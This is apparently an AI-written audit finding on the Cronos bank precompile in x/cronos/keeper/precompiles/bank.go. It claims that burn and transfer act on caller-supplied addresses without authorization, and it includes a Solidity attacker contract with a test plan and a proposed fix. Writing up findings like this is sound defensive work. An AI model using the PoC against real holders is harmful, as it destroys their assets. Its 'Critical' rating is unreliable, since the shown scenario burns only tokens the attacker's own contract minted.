The core of the vulnerability is in `x/cronos/keeper/precompiles/bank.go`. Let me confirm the exact logic:

### Title
Unprivileged EVM Contract Can Burn Any Holder's `evm/0x<contract>` Tokens Without Authorization — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `burn` handler derives the token denom from `contract.Caller()` (the calling contract's address) but accepts the **address to burn from** as an arbitrary caller-supplied argument. There is no check that the burn target is the caller itself or has authorized the burn. Any EVM contract can therefore burn `evm/0x<itself>` tokens from any victim who holds them.

---

### Finding Description

In `BankContract.Run`, the `MintMethodName`/`BurnMethodName` branch handles both operations with shared logic: [1](#0-0) 

```go
recipient := args[0].(common.Address)   // caller-supplied victim address
...
addr := sdk.AccAddress(recipient.Bytes())
if err := bc.checkBlockedAddr(addr); err != nil { ... }
denom := EVMDenom(contract.Caller())    // denom tied to calling contract
amt := sdk.NewCoin(denom, ...)
```

For the burn path: [2](#0-1) 

```go
} else {
    if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
        ...
    }
    if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
        ...
    }
}
```

`addr` is the victim's address (from `args[0]`). `SendCoinsFromAccountToModule` is a privileged Cosmos SDK bank operation that requires no signature from `addr` — it is callable by any module. The precompile invokes it unconditionally, with no guard verifying that `recipient == contract.Caller()` or that the victim has granted any allowance.

The only guards present are:

- `readonly` — prevents static calls only [3](#0-2) 
- `amount.Sign() <= 0` — prevents zero/negative amounts [4](#0-3) 
- `checkBlockedAddr` — only rejects Cosmos module accounts [5](#0-4) 
- `IsSendEnabledCoins` — only checks denom-level send flag [6](#0-5) 

None of these prevent an attacker contract from burning tokens from an arbitrary victim address.

The same structural flaw exists in the `transfer` handler, where `sender` is also caller-supplied with no authorization check: [7](#0-6) 

---

### Impact Explanation

An attacker who deploys a contract at `0xAttacker` controls the denom `evm/0xAttacker`. They can:

1. Mint `evm/0xAttacker` tokens to any victim (e.g., as a payment or airdrop) — this is already permitted by design.
2. Call `bank.burn(victim_address, amount)` from `AttackerContract`.
3. The precompile computes `denom = "evm/0xAttacker"` and calls `SendCoinsFromAccountToModule(victim_addr, ...)`, destroying the victim's tokens with no consent required.

This is **unauthorized destruction of EVM-native tokens** — a Critical impact per the scope rules.

---

### Likelihood Explanation

The attack is fully self-contained: the attacker deploys a contract, mints tokens to a target, then burns them. No admin keys, governance, or external assumptions are needed. The victim only needs to hold a nonzero balance of the attacker's denom, which the attacker can arrange unilaterally via the `mint` path.

---

### Recommendation

In the `BurnMethodName` branch, enforce that the address being burned from is the calling contract itself:

```go
// Only allow burning from the caller's own Cosmos address
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn from caller's own address")
}
```

Equivalently, remove the `recipient` argument from the burn ABI and derive the burn address from `contract.Caller()` directly, mirroring how `denom` is derived. Apply the same fix to the `transfer` handler's `sender` argument.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function balanceOf(address, address) external view returns (uint256);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: attacker mints evm/0xAttackerContract tokens to victim
    function mintToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: attacker burns victim's tokens without victim's consent
    function burnFromVictim(address victim, uint256 amount) external {
        bool ok = bank.burn(victim, amount);
        require(ok, "burn failed");
    }
}
```

**Test plan:**

1. Deploy `AttackerContract` at `0xAttacker`.
2. Call `mintToVictim(victim, 1000)` — victim now holds 1000 `evm/0xAttacker` tokens.
3. Assert `bank.balanceOf(0xAttacker, victim) == 1000`.
4. Call `burnFromVictim(victim, 1000)` from the attacker's EOA.
5. Assert `bank.balanceOf(0xAttacker, victim) == 0` — victim's tokens destroyed without consent.

The `denom` computed on line 130 is `"evm/" + contract.Caller().Hex()` = `"evm/0xAttacker"`, and `SendCoinsFromAccountToModule` on line 144 executes against `victim_addr` with no authorization check, confirming the exploit path is reachable. [8](#0-7) [9](#0-8)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L92-101)
```go
func (bc *BankContract) checkBlockedAddr(addr sdk.AccAddress) error {
	to, err := sdk.AccAddressFromBech32(addr.String())
	if err != nil {
		return err
	}
	if bc.bankKeeper.BlockedAddr(to) {
		return errorsmod.Wrapf(errortypes.ErrUnauthorized, "%s is not allowed to receive funds", to.String())
	}
	return nil
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L114-116)
```go
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
```

**File:** x/cronos/keeper/precompiles/bank.go (L121-131)
```go
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
```

**File:** x/cronos/keeper/precompiles/bank.go (L133-135)
```go
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
```

**File:** x/cronos/keeper/precompiles/bank.go (L143-149)
```go
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
```

**File:** x/cronos/keeper/precompiles/bank.go (L175-192)
```go
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
```
